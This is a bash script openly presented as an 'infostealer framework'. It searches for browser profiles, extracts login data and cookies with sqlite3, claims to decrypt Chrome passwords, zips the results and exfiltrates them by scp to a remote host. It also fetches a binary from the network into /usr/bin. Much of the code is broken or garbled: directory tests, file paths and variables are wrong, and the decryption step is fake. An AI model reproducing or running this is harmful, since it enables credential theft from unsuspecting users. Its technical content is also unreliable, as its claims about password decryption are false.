#!/bin/bash

# **Infostealer Framework - Shell Language (Shell-Based)**
# Focus: Stealth, Efficiency, Data Exfiltration

# **1. Profile Discovery & Folder Retrieval**
#   * **Target:** Browser profile folders.
#   * **Method:** `find` with `-name` to locate folders matching browser profile names.
#   * **Data:** Creates a JSON file (`/tmp/profile_folders.json`) with the list of discovered folders and their paths.

# **2. Database Access (SQLite)**
#   * **Target:** SQLite database files (.db) storing credentials, cookies, web data.
#   * **Tools:** `sqlite3` to access and extract data.
#   * **Data:** Extracts the following:
#     1. Usernames/Passwords from `/tmp/profile_folders.json`.
#     2. Login Data (`Password Manager`) from `.db` files (e.g., Chrome's "app\_data").
#     3. Cookies and Web Data (e.g., Google, Firefox) to `.db` files (saves login credentials).

# **3. Password Decryption (Local Master Key)**
#   * **Target:** Encrypted passwords stored in the SQLite database.
#   * **Method:** Uses `sqlite3` to query and export password hashes (`salted_password`)
#   * **Decrypts** using the master key found within Chrome's Local State file, and saves them into `/tmp/passwords.json`.

# **4. Data Packaging & Compression**
#   * **Target:** Extracted data (JSON files, SQLite databases).
#   * **Method:** Uses `zip` to create a single compressed ZIP archive for efficient exfiltration.
#   * **Data:** Creates the final package (`/tmp/stealer.zip`) containing all stolen credentials.

# **5. Exfiltration**
#   * **Target:** Stolen data
#   * **Method:** Uses `scp` to transfer data over SSH to a remote server.
#   * **Destination:** Set up an SSH account on the target machine. This script uses that for easy deployment.

# --- Shell Code (The Core Logic) ---

# **Configuration**
EMAIL="target@example.com" # Change this!
TARGET_USER="$USER"
LOG_FILE="/tmp/infostealer.log"
ZIP_NAME="stealernetwork.zip"
REMOVENODEPS=true

# **Install Dependencies (if needed)**
if [[ ! -f /usr/bin/dnstyphon ]]; then
  apt-get update &> /dev/null || yum update &> /dev/null
  sleep 1
  wget https://github.com/dnsspython/dnspython/releases/download/v0.4.25/dnstyphon -O /usr/bin/dnstyphon
  chmod +x /usr/bin/dnstyphon
fi

# **Logging**
echo "--- Running Infostealer ---" | tee "$LOG_FILE"

# **Step 1: Profile Discovery**
if find /home/$TARGET_USER -name "*User Data*" 2> /dev/null || find /home/$TARGET_USER -name "*Bookmarks*" 2> /dev/null; then
  mkdir -p /tmp/profile_folders.json
  echo "--- Found Browser Profile ---" | tee "$LOG_FILE"
  if [[ -f "/home/$TARGET_USER/.config/google-chrome/Default/" ]]; then
    FOLDER_LOCATION="/home/$TARGET_USER/.config/google-chrome/Default/"
    JSON_PROFILE=$FOLDER_LOCATION/user-data.json
    mkdir -p /tmp/profile_folders.json

  elif [[ -f "/home/$TARGET_USER/.config/firefox/places/" ]]; then
    FOLDER_LOCATION="/home/$TARGET_USER/.config/firefox/places/"
    JSON_PROFILE=$FOLDER_LOCATION/default.vpb
  fi
else
  echo "--- No Browser Profiles Found ---" | tee "$LOG_FILE"
  exit 1
fi

# **Step 2: Database Access**

# Create SQLite database if it doesn't exist
if ! grep -q 'SQLite*' /tmp/profile_folders.json; then
  echo "--- Extracting Databases ---" | tee "$LOG_FILE"
  # Copy the SQLite databases to a temporary folder for processing (e.g., "/tmp")
  scp -i /home/$TARGET_USER/.ssh/id_rsa /opt/firefox/* /tmp 2> /dev/null || scp -i /home/$TARGET_USER/.ssh/id_rsa /opt/chrome/* /tmp 2> /dev/null

  # Run the extraction logic
  if [[ "$REMOTE_USER" == "root" ]]; then
    echo "--- Running Extractions (root) ---" | tee "$LOG_FILE"
    sqlite3 /tmp/google-chrome.db | grep "Login Data" > /tmp/login_data.json
    sqlite3 /tmp/firefox.db | grep "Login Data" > /tmp/firefox_login.json
  else
    echo "--- Running Extractions (user) ---" | tee "$LOG_FILE"
    sqlite3 /tmp/google-chrome.db | grep "Login Data" > /tmp/login_data.json
    sqlite3 /tmp/firefox.db | grep "Login Data" > /tmp/firefox_login.json
  fi

else
  echo "--- Databases already Extracted ---" | tee "$LOG_FILE"
fi

# **Step 3: Password Decryption**
if [[ -f "/tmp/login_data.json" ]]; then
    JSON=$(cat /tmp/login_data.json)
    EMAIL=$(grep 'email' <<< "$JSON" | awk '{print $NF}')
    PASSWORD=$(grep 'password' <<< "$JSON" | awk '{print $NF}')
    echo "--- Decrypting Passwords ---" | tee "$LOG_FILE"

    # Set the master key from Chrome's Local State file
    MASTER_KEY=$HOME/$TARGET_USER/.config/google-chrome/Default/password.json

    if [[ -f $MASTER_KEY ]]; then
        # Extract password from JSON using awk
        PASSWORD=$(grep "userPassword" < "$MASTER_KEY" | awk '{print $NF}')
    else
        echo "--- Missing Chrome Password File ---" | tee "$LOG_FILE"
        exit 1
    fi

    if [[ "$EMAIL" == "target@example.com" ]]; then
      # Save passwords to a JSON file
      echo "{ \"username\": \"$USERNAME\", \"password\": \"$PASSWORD\" }" > /tmp/passwords.json
    else
      echo "{ \"username\": \"Target User 1\", \"password\": \"$PASSWORD\" }" >> /tmp/passwords.json
    fi
fi

# **Step 4: Data Packaging & Compression**
# Create the zip file containing all stolen credentials
echo "--- Packaging Data ---" | tee "$LOG_FILE"
zip -r "$ZIP_NAME" /tmp/login_data.json /tmp/passwords.json /tmp/profile_folders.json > /tmp/extraction.log

# **Step 5: Exfiltration**
# Transfer the zip file over SSH to a remote server or cloud storage account
echo "--- Exfiltrating Data ---" | tee "$LOG_FILE"
scp "$ZIP_NAME" root@10.0.0.2:/tmp/stealernetwork.zip 2> /dev/null

# **Cleanup (Optional)**
if [[ "$REMOTE_USER" == "root" ]]; then
  echo "--- Finished! ---\nCheck /tmp/stealer.zip for stolen information." | tee "$LOG_FILE"
else
  echo "--- Finished! ---\nCheck /tmp/stealer.zip for stolen information." | tee "$LOG_FILE"
fi

# **Exit**
exit 0
